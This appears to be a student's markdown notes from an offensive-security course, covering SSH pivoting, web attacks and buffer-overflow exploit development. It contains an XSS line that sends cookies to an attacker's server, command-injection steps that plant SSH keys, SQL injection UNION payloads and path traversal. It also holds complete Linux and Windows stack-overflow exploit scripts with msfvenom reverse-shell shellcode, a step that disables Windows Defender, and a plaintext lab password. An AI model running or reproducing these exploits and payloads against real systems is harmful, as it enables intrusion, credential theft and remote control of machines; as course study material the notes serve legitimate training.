# Security
```
HOUT-005-M 
STACK # 19 
PASS: NGhXitkmKFkviR3
IP: 10.50.37.133
Linux op stations: 192.168.65.20, 10.50.37.248
Windws OP: 192.168.65.10, 10.50.38.70
Practice SQL IP: 10.50.29.140

```
# Control Socket
```
## Set up control Socket 
ssh -MS /tmp/jump student@10.50.37.133

## Ping sweep from jump box 
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

## Dynamic port forward
ssh -S /tmp/jump -O forward -D9050

## Nmap found IP's 
proxychaains nmap x.x.x.x

## Interogate found ports 
proxychains nc x.x.x.x ##

## Port forward 
ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L3333:192.168.28.100:2222
  - Can contain multiple jumps within socket file 

## Set up next hop 
 ssh -MS /tmp/t1 credentials@127.0.0.1 -p 3333

## Cancel Port Forward 
ssh -S /t,mp/jump jump -O cancel -L1111:192.168.1.100:80
ssh -S /tmo/jump jump -O cancel -D9050

```

# Penetration Testing 


## 6 Phases
```
* Mission definition 
* Recon 
* Footprinting 
* Explotation & Initial Access
* Post-Explotation 
* Document Mission

### Phase 1 Mission definition 
* Define Goals, scope and RoE

### Phase 2 Recon 

### Phase 3 Footprinting 

### Phase 4 Exploitation & Initial Access 

### Phase 5 Post-Exploitation 

### Phase 6 Document Mission 

```

# nmap Scripts

```
/usr/share/nmap/scripts -> Locationof nmap scripts
```
# Web Exploitation 
## Day #1 

```
* Http tools
- tcpdump 
- wireshark 

* Http Methods 
- Get 
- Post 
- Head 
- Put

* Http Response Codes 
- 10X -> Information al 
- 2XX -> Success
- 30X -> Redirection 
- 4XX -> Client Error 
- 5XX -> Server Error 

* Http Fields 
- User-Agent 
- Referer 
- Cookie 
- Date 
- Server
- Set-Cookie 

* ?var=hi -> Sends a GET request for specified variable to web server 
  - ?home=../../../../../etc/passwd

```

# Wget 

```
* Recursively download
* Recover from Broken Transfers 
* SSL/TLS support

Examples: 
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php

```

# cURL 

``` 
* Not Recursive 
* Can use pipes 
* Upload abilty 
* Supports more protocols vs Wget like SCP & POP3

Examples: 
curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png

``` 

# JavaScript(JS)
```
* Allows websites to interact with the client

* JavaScript runs on the client’s machine

* Coded as .js files, or in-line of HTML

* changeText()

* <script>document.location="http://10.50.X.X:8000/"+document.cookie;</script>
  - python3 -m http.server
    -> Opens a http port for the cookies to be sent to on your machine


```
# Enumeration 
```
* ROBOTS.TXT -> 
* Legitimate Surfing 
* Tools 
- NSE scripts 
- Nikto 
Burp suite (outside class)

```
# Cross-Site Scipting (XSS) Overview 

```
* Insertion o farbitary code into a webpage, that excutes in browser of visitors 
* Unsanitized GET,POST, and PUT methods allow JS to be placed on websites 
* Often found in forums that allow HTML

```

# Reflected XSS 

```
* Most common form of XSS 
* transient, occurs in erro rmessages or serach results 
* Delivered through intermediate media, such as a link in an email 
* Characters that are normally illegal in URLs can be Base64 encded 

```

# Sever-Side injection 

```
Directory Traversal/Path Traversal


Ability to read/execute outside web server’s directory

Uses ../../ (relative paths) in manipulating a server-side file path


```

# Malicious 
ile upload 


# Command Injection 

```
* ';' to run you own set commands 
* can be utilized to enumerate directories and files 
* var/www/html -> apache home directory 
* Can be used to upload public ssh key 
* make directory for ssh on webserver
* regenertae public and private keys 
  - ssh-keygen -t rsa -b 4096 
  - cat ../../.ssh/id_rsa.pub
  - echo "entire rsa key" > /var/www/.ssh/authorized_keys
  - ssh www-data@<ip>




```

# Web Day 2 
## SQL Injections 

```
* SQL 
- Structured Query Language-ANSI 
- Additional Commands added by vendors 
- Select and Union 

```
# SQL POST METHOD 
```
* mysql -> used to drop into sql server 
* show databases ; -> dumps databases to screen 
* use information_schema : -> drops into specified database 
* show columns from columns ; -> displays different fields within the database
  - Table_schem
  - Table_name 
  - Column_name 
* select table_name from information_schema.columns ; - displays table_name columns
* select table_name,column_name from information_schema.columns ; - displays table_name columns
* select table_schema,table_name,column_name from information_schema.columns ; - displays table_name columns
* show tables from sessions ; 
* show columns from session.tires ;
* select tireid,name,size from session.Tires ;
* select tireid,name,size from session.Tires UNHION SELECT name,type,cost from session.car ;
* select tireid,name,size,4 from session.Tires UNHION SELECT name,type,cost,color from session.car ; -> using 4 as a place holder to display new option 
* Audi' UNION SELECT username,2,passwd,jump,5 FROM session.userinfo # 
* Audi' UNION SELECT tireid,2,size,cost,5 FROM session_schema.columns



# SQL Injection on a unsanitized website
* 'Or 1='1 -> veridies i data base i 
* tURN GET rEQUEST INT RAW DATA 
* Audi UNION SELECT 1,2,3,4,5 # 

Steps: 
1) ID Vuln. Field
2) ID # of Columns
3) Dump Database with Golden Statment 


```

# SQL GET METHOD 
```
-> In URL search bar 
* Selection=2 OR 1=1 
  - Test every number until you null out 
* UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
* UNION SELECT session_id,user_id,statusFROM session.session_log # 
* UNION SELECT id,name,@@version FROM session.user 



```
UNION SELECT TABLE_CATALOg,TABLE_SCHEMA,TABLE_NAME FROM information.schema.tables

# Reverse Egineering
```





```

# Post exploitation 
## Common Terms 
```
* Stack -> Contigous section of memory used for passing arguements 
* 
```
## Bufer Overflow Defenses  
```
* Non excutable 
* Addresss Apce Layout Randomization (ASLR) 
* Dat aExcution Prevention (DEP) 
* Stack canaries
* Position Indeendent Excutable (PIE)
```

## Technical Help
```
* IDA, GHIDRA 
* GDB, MONA,IMMUNITY 
* BASH, PYTHON
```
# Linux Explotation Dev. 
```
- Check for arugments -> ./exe <<<$(echo "AAAAAAAAAAAAAAAAA"
- Enter gdb 
- bufer = website bufer //https://wiremask.eu/tools/buffer-overflow-pattern-generator/
- (in gdb) run <<<$(./bufff.py) 
- cp eip hex value, insert into websire, click outside box. umber given is yourexact buffer
- creat nop sled -> nop = "\x90" * 15
- env - gdb "exe name" 
- show env
- unset env LINES
- unset env COLUMNS
- run the program 
- Crash the program first before running info proc map in GDB 
- Run find to find jump esp -> find /b 0xf7de1000, 0xffffe000 0xff, 0xe4 # beggining hex after heap line, last hex value in stack line
- copy and paste first 4 addresses after running find command 
- convert from big endian to little endian 
- After converting replace eip with first converted memory location 
- scp exploit file over to machin e
- find eip for that machine 
- find new shell for target machine
- If permissions denied, modify exploit shell to said command trying to run 


- Msfconsole shell code: 
- msfdb init -> initialze database 
- use payload/linux/x86/exec
- show options
- set CMD whoami
- generate -b "\x00" -f python
- copy shell code into script
- add (+buf into print statment) 
```
## Example Scripts
```
#!/usr/bin/env python

buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xdb\xc6\xb8\xaa\x49\x42\x92\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x0b\x83\xc3\x04\x31\x43\x15\x03\x43"
buf += b"\x15\x48\xbc\x28\x99\xd4\xa6\xff\xfb\x8c\xf5\x9c"
buf += b"\x8a\xab\x6e\x4c\xfe\x5b\x6f\xfa\x2f\xf9\x06\x94"
buf += b"\xa6\x1e\x8a\x80\xbe\xe0\x2b\x51\xb6\x88\x44\x30"
buf += b"\x55\x21\x9b\xe5\xf6\x38\x7a\xc4\x79"
print (buffer+eip+nop+buf)
# find /b 0xf7de1000, 0xffffe000 0xff, 0xe4 # beggining hex after stack line, last hex value in stack line 
# 0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
# 0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
# 0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
# 0xf7f6460f -> 0xf7 f6 46 0f "\x0f\x46\xf6\xf7"

-----------------------------------------------------------------------------------------------------------

#!/usr/bin/env python 

buffer = "A" * 76

eip = "\x59\x3b\xde\xf7"

nop = "\x90" * 15

buf =  b""
buf += b"\xb8\x9d\x92\xd0\xec\xd9\xc7\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x0b\x31\x46\x14\x83\xc6\x04\x03\x46"
buf += b"\x10\x7f\x67\xba\xe7\x27\x11\x69\x9e\xbf\x0c\xed"
buf += b"\xd7\xd8\x27\xde\x94\x4e\xb8\x48\x74\xec\xd1\xe6"
buf += b"\x03\x13\x73\x1f\x14\xd3\x74\xdf\x6c\xbb\x1b\xbe"
buf += b"\xff\x52\xe4\x17\x53\x2d\x05\x5a\xd3"
print(buffer+eip+nop+buf)
# find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
# 0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
# 0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
# 0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
# 0xf7f6460f -> 0xf7 f6 46 0f "\x0f\x46\xf6\xf7"

#comrade 
#0xf7df1b51 0xf7 df 1b 51 "\x5\x1b\xdf\xf7"
#0xf7f6674b
#0xf7f72753
#0xf7f72c6b
```

# Windows Exploitation Dev. 
```
- Run strings on .exe file 
  - Ex: C:\Users\Student\Desktop.\SysinternalsSuite\strings.exe C:\Users\Student\Desktop\secureserverind.exe
- When analyzing sting look for "strcopy" "gets" etc. (Vulnerable Stack indicators) 
- get-content .\essfunc.dll | select -First 1
  - command to see if .exe can run 
- If possible to run on windows; run the program 
- watch for possible port connection attemp 
- nc on linux ops station 
  - If not working ensure firewall is allowing port connection through 
- Run commands that are allowed in nc connection 
- Insert .exe file into decompiler 
- strncmp -> comapres str1 and str2 by a specified number of bytes 
- run immunity debugger
  - attach .exe 
  - play program 
- create script 
- import socket, 
  EX: #!/usr/bin/env python 
import socket

buf = "TRUN/.:/"
buf += ""

s = socket.socket (socket.AF_INET, soccket.SOCK_STREAM)
s.connect (("192.168.65.10",9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()

- Create buffer with wiremask.EU
- check immunity debugger to make sure it ran 
- Insert EIP into website to find exact offset 
- replace buf variable with 2003, add "BBBB" 
- run script again to verify eip is being replaced 
- run !mona module in bottom console 
- run !mona jmp -r esp -m "vulnerable.dll" in bottom console 
- copy first 4 mem. addresses into script(cooment out with 3 single quotes)
  - if copying ensure letters are lowercase, add "0x"
- Turn into little endian 
- Replace BBBB with first converted mem address -> buf += "\xa0\x12\x50\x62"
- insert nop sled buf += "\x90" * 15
- Rewind debugger and play it again 
- Turn off real time threat protection on windows defender

- msfvenom -p windows/shell/reverse_tcp lhost= 192.168.65.20 lport=1738 -b "\x00" -f python
  - Venom command with local ip and random high port
- msf console 
  - use multi/handler 
  - show options 
  -  set payload windows/meterpreter/reverse_tcp
  - set lhost 0.0.0.0 (listen on all)
  - set lport to listening port set
  - exploit 
- Should be dropped into a meterpreter shell
- run sysinfo on meterpreter to verify

EX: 
#!/usr/bin/env python 
import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 15

buf += b"\xd9\xee\xd9\x74\x24\xf4\x58\xbe\xfb\x2e\x57\x06"
buf += b"\x29\xc9\xb1\x59\x31\x70\x19\x83\xc0\x04\x03\x70"
buf += b"\x15\x19\xdb\xab\xee\x52\x24\x54\xef\x0c\xac\xb1"
buf += b"\xde\x1e\xca\xb2\x73\xae\x98\x97\x7f\x45\xcc\x03"
buf += b"\x0b\x2b\xd9\x24\xbc\x81\x3f\x0a\x3d\x24\x80\xc0"
buf += b"\xfd\x27\x7c\x1b\xd2\x87\xbd\xd4\x27\xc6\xfa\xa2"
buf += b"\x42\x27\x56\x62\x26\xe5\x47\x07\x7a\x35\x69\xc7"
buf += b"\xf0\x05\x11\x62\xc6\xf1\xad\x6d\x17\x72\x75\x4e"
buf += b"\x96\x57\x0d\xc6\x80\x07\x97\x1e\xc4\x9b\xde\x91"
buf += b"\xda\x68\xd4\x5a\x25\xb8\x24\x9d\x8a\x85\x88\x10"
buf += b"\xd2\xc2\x2f\xcb\xa1\x38\x4c\x76\xb2\xfb\x2e\xac"
buf += b"\x37\x1b\x88\x27\xef\xff\x28\xeb\x76\x74\x26\x40"
buf += b"\xfc\xd2\x2b\x57\xd1\x69\x57\xdc\xd4\xbd\xd1\xa6"
buf += b"\xf2\x19\xb9\x7d\x9a\x38\x67\xd3\xa3\x5a\xcf\x8c"
buf += b"\x01\x11\xe2\xdb\x36\xda\xfc\xe3\x6a\x4c\x30\x2e"
buf += b"\x95\x8c\x5e\x39\xe6\xbe\xc1\x91\x60\xf2\x8a\x3f"
buf += b"\x76\x83\x9d\xbf\xa8\x2b\xcd\x41\x49\x4b\xc7\x85"
buf += b"\x1d\x1b\x7f\x2f\x1e\xf0\x7f\xd0\xcb\x6c\x8a\x46"
buf += b"\x34\xd8\xcb\x82\xdc\x1a\xcc\xac\xd6\x93\x2a\xe0"
buf += b"\xb6\xf3\xe2\x41\x67\xb3\x52\x2a\x6d\x3c\x8c\x4a"
buf += b"\x8e\x97\xa5\xe1\x61\x41\x9d\x9d\x18\xc8\x55\x3f"
buf += b"\xe4\xc7\x13\x7f\x6e\xed\xe4\xce\x87\x84\xf6\x27"
buf += b"\xf0\x66\x07\xb8\x95\x66\x6d\xbc\x3f\x31\x19\xbe"
buf += b"\x66\x75\x86\x41\x4d\x06\xc1\xbe\x10\x3e\xb9\x89"
buf += b"\x86\x7e\xd5\xf5\x46\x7e\x25\xa0\x0c\x7e\x4d\x14"
buf += b"\x75\x2d\x68\x5b\xa0\x42\x21\xce\x4b\x32\x95\x59"
buf += b"\x24\xb8\xc0\xae\xeb\x43\x27\xad\xec\xbb\xb5\x9a"
buf += b"\x54\xd3\x45\x9b\x64\x23\x2c\x1b\x35\x4b\xbb\x34"
buf += b"\xba\xbb\x44\x9f\x93\xd3\xcf\x4e\x51\x42\xcf\x5a"
buf += b"\x37\xda\xd0\x69\xec\xed\xab\x02\x13\x0e\x4c\x0b"
buf += b"\x70\x0f\x4c\x33\x86\x2c\x9a\x0a\xfc\x73\x1e\x29"
buf += b"\x0f\xc6\x03\x18\x9a\x28\x17\x5a\x8f"

'''

0x625012a0 -> 0x62 50 12 a0 "\xa0\x12\x50\x62"
0x625012ad -> 0x62 50 12 ad "\xad\x12\x50\x62"
0x625012ba -> 0x62 50 12 ba "\xba\x12\x50\x62"
0x625012c7 -> 0x62 50 12 c7 "\xc7\x12\x50\x62"

'''




s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect (("192.168.65.10",9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()

```

# Priv esc, Persistence and Track Covering Windows
## Modes/Levels 
```
* Kernel vs. User 
* Privilieged vs. Unpriviliged 
```
## Win. Access Control Model 
```
* Access Tokens 
* Security Descriptors 
  - DACl 
  - SACL 
  - ACE's
```
## Windows Integrity 
```
* Untrusted -> Anonymous SID access tokens 
* Low -> Everyone SID access token 
* Medium -> Authenticated Users
* High -> Administrators 
* System -> System Services (LocalSystem)
```
## UAC 
```
* Notification Settings
* Prompt for Privilege Escalation 
* reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -> Run to view UAC settings 
```
## 
```


```







